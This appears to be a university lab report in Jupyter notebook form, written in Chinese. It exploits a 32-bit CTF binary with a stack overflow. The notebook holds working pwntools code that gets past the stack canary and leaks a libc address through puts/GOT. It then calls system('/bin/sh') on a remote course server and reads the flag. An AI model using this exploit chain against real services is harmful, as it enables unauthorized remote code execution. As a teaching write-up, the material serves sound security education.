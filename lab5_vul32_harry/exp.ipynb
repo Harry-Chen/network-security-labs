{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 网络安全工程与实践 第四次实验\n",
    "计63 陈晟祺 2016010981\n",
    "\n",
    "本次实验的内容是 32 位二进制文件的栈溢出漏洞利用。实验报告分为三个版本：\n",
    "\n",
    "- `exp.py`: 可用 iPython2 执行的利用脚本\n",
    "- `exp.ipynb`: 可用 Jupyter Notebook 执行的利用脚本和报告\n",
    "- `exp.html`: 可用浏览器打开的实验报告（嵌入脚本和结果）\n",
    "\n",
    "## 本地分析\n",
    "\n",
    "我们先使用 pwntools 打开二进制文件"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: PWNLIB_NOTERM=true\n",
      "[*] '/home/harry/Workspace/vul32/vul32'\n",
      "    Arch:     i386-32-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    Canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      No PIE (0x8048000)\n"
     ]
    }
   ],
   "source": [
    "%env PWNLIB_NOTERM=true\n",
    "from pwn import *\n",
    "\n",
    "context.endian = 'little'\n",
    "context.arch = 'i686'\n",
    "\n",
    "name = './vul32'\n",
    "binary = ELF(name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "可以看到有 Stack Canary 和 NX，但是没有 PIE。  \n",
    "挂上 gdb 先 fuzz 一下。输入一个很长的字符串，观察到在 `dovuln()` 中崩溃。  \n",
    "使用 IDA 反编译该函数，得到以下代码（经过变量重命名）：\n",
    "```C\n",
    "int dovuln()\n",
    "{\n",
    "  int i; // eax\n",
    "  char c; // [esp+4h] [ebp-44h]\n",
    "  char buf[51]; // [esp+5h] [ebp-43h]\n",
    "  int offset; // [esp+38h] [ebp-10h]\n",
    "  unsigned int stack_canary; // [esp+3Ch] [ebp-Ch]\n",
    "\n",
    "  stack_canary = __readgsdword(0x14u);\n",
    "  memset(buf, 0, 0x30u);\n",
    "  offset = 0;\n",
    "  while ( 1 )\n",
    "  {\n",
    "    if ( read(0, &c, 1u) != 1 )\n",
    "      exit(0);\n",
    "    if ( c == 10 )\n",
    "      break;\n",
    "    i = offset++;\n",
    "    buf[i] = c;\n",
    "  }\n",
    "  return puts(buf);\n",
    "}\n",
    "```\n",
    "我们可以知道函数的栈布局为：\n",
    "```\n",
    "Return Address (EBP + 4)\n",
    "Saved EBP (EBP)\n",
    "...\n",
    "Stack Canary (EBP - 12)\n",
    "int offset (EBP - 16)\n",
    "char buf[51] (EBP - 67)\n",
    "char c (EBP - 68)\n",
    "```\n",
    "所以根据上述的代码逻辑，可以通过溢出修改 `offset` 来绕过 Stack Canary 的检查。具体来说，只需要改变 `buf` 的第 52 个字节，也就是 `offset` 的 LSB。将其改为 4+67=71，就能直接在接下来的写中更改函数的返回地址，以及栈更高处的内容。 \n",
    "  \n",
    "先使用跳回 main 的方法在本地测试该方法的可行性："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Starting local process './vul32'\n",
      "[+] Starting local process './vul32': pid 22654\n",
      "Plz input something:\n",
      "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK\n",
      "Plz input something:\n",
      "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "[*] Stopped process './vul32' (pid 22654)\n"
     ]
    }
   ],
   "source": [
    "main = binary.symbols['main']\n",
    "payload = 'A' * 51 + chr(71) + p32(main)\n",
    "p = process(name)\n",
    "print(p.recv())\n",
    "p.send(payload)\n",
    "p.send('\\n')\n",
    "print(p.recv())\n",
    "p.kill()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "可以看到上述思路是可行的。\n",
    "\n",
    "## 远程利用\n",
    "\n",
    "为了获得 shell，我们需要调用 libc 中的 `system` 函数并传入 `/bin/sh`。但是文件中并没有导入该符号，因此需要设法找到这个地址。考虑到 libc 的各个函数偏移量都是一定的，我们只需要获得任意一个函数的地址即可。观察到 `dovuln()` 中调用了 `puts`，我们可以从这个函数入手。由动态导入机制可知，其实际地址保存在 GOT 表中："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "puts_address_ptr = binary.got['puts']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "只需要设法泄露出这个地址的值就可以了。巧合的是，我们可以把这个地址传给 `puts()` 函数来达成这一目标。考虑 32 位 cdecl 调用约定，我们需要将栈布局为：\n",
    "```\n",
    "puts_address_ptr (EBP + 12)\n",
    "Return Address of puts (EBP + 8)\n",
    "Address of puts (EBP + 4)\n",
    "Saved EBP (EBP)\n",
    "...\n",
    "```\n",
    "这样在函数返回后，`puts` 就会输出我们所需的地址。如果我们将其返回地址指向 `main` 的地址，则接下来还可进行第二次利用。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to 202.112.51.154 on port 20001\n",
      "[x] Opening connection to 202.112.51.154 on port 20001: Trying 202.112.51.154\n",
      "[+] Opening connection to 202.112.51.154 on port 20001: Done\n",
      "Plz input something:\n",
      "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS\n",
      "\n",
      "@�������@e���#���\u0011��\n",
      "Plz input something:\n",
      "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "[*] Closed connection to 202.112.51.154 port 20001\n"
     ]
    }
   ],
   "source": [
    "p = remote('202.112.51.154',20001)\n",
    "payload = 'A' * 51 + chr(71) + p32(binary.symbols['puts']) + p32(main) + p32(puts_address_ptr)\n",
    "print(p.recv())\n",
    "p.sendline(payload)\n",
    "print(p.recv())\n",
    "leaked_info = p.recv()\n",
    "print(leaked_info)\n",
    "p.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "可以看到我们成功调用了 `puts` 函数并泄露了地址如下："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xf7dcd140\n"
     ]
    }
   ],
   "source": [
    "puts_address = u32(bytes(leaked_info.splitlines()[1][0:4]))\n",
    "print(hex(puts_address))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "下面我们计算 libc 中各个符号的偏移量："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] '/home/harry/Workspace/vul32/libc.so.6'\n",
      "    Arch:     i386-32-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    Canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      PIE enabled\n",
      "0x5f140\n"
     ]
    }
   ],
   "source": [
    "libc = ELF('./libc.so.6')\n",
    "puts_libc = libc.symbols['puts']\n",
    "system_offset = libc.symbols['system'] - puts_libc\n",
    "sh_str_offset = next(libc.search('/bin/sh\\x00')) - puts_libc\n",
    "print(hex(puts_libc))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "可以看到泄露的 `memset` 地址与 libc 中是对应的。  \n",
    "接下来就在可以远程运行 shell 命令。考虑到 ASLR 的影响，libc 的地址每次加载可能都会变化，所以地址泄露和函数调用需要在同一个进程中完成。  \n",
    "由于 Jupyter Notebook 不能进行交互，我们使用函数每次运行一条命令："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to 202.112.51.154 on port 20001\n",
      "[x] Opening connection to 202.112.51.154 on port 20001: Trying 202.112.51.154\n",
      "[+] Opening connection to 202.112.51.154 on port 20001: Done\n"
     ]
    }
   ],
   "source": [
    "p = remote('202.112.51.154', 20001)\n",
    "p.recv()\n",
    "\n",
    "# leak memset address\n",
    "payload = 'A' * 51 + chr(71) + p32(binary.symbols['puts']) + p32(main) + p32(puts_address_ptr)\n",
    "p.sendline(payload)\n",
    "p.recv()\n",
    "leaked_info = p.recv()\n",
    "memset_address = u32(bytes(leaked_info.splitlines()[1][0:4]))\n",
    "\n",
    "# calculate function address\n",
    "system_address = memset_address + system_offset\n",
    "sh_str_address = memset_address + sh_str_offset\n",
    "\n",
    "# getshell!\n",
    "payload = 'A' * 51 + chr(71) + p32(system_address) + p32(main) + p32(sh_str_address)\n",
    "p.sendline(payload)\n",
    "p.recv()\n",
    "\n",
    "def remote_exec(cmd):\n",
    "    p.sendline(cmd)\n",
    "    print(p.recvlines(timeout=0.5))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "下面就可以在远程服务器上执行命令："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['', 'ctf_puck']\n"
     ]
    }
   ],
   "source": [
    "remote_exec('whoami')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['flag', 'run.sh', 'vul32']\n"
     ]
    }
   ],
   "source": [
    "remote_exec('ls /home/ctf_puck/')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['flag{Ok_yOu_get@#$_it!}']\n"
     ]
    }
   ],
   "source": [
    "remote_exec('cat /home/ctf_puck/flag')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "最终得到 flag 为 `flag{Ok_yOu_get@#$_it!}`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Closed connection to 202.112.51.154 port 20001\n"
     ]
    }
   ],
   "source": [
    "p.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 总结\n",
    "\n",
    "本次实验是一个比较复杂的栈溢出攻击，需要绕过 NX、Stack Canary 以及 ASLR 等多种保护机制。事实上可利用的机制不是唯一的，如其他被导入到程序中的符号也可用来进行 libc 地址泄露。如果在 x86_64 架构上，我们就无法简单地通过操纵栈内容进行函数传参与调用，而需要 ROP 等更复杂的手段。值得一提的是， pwntools 可以自动化发现和构建 ROP 链，非常方便。"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.15"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
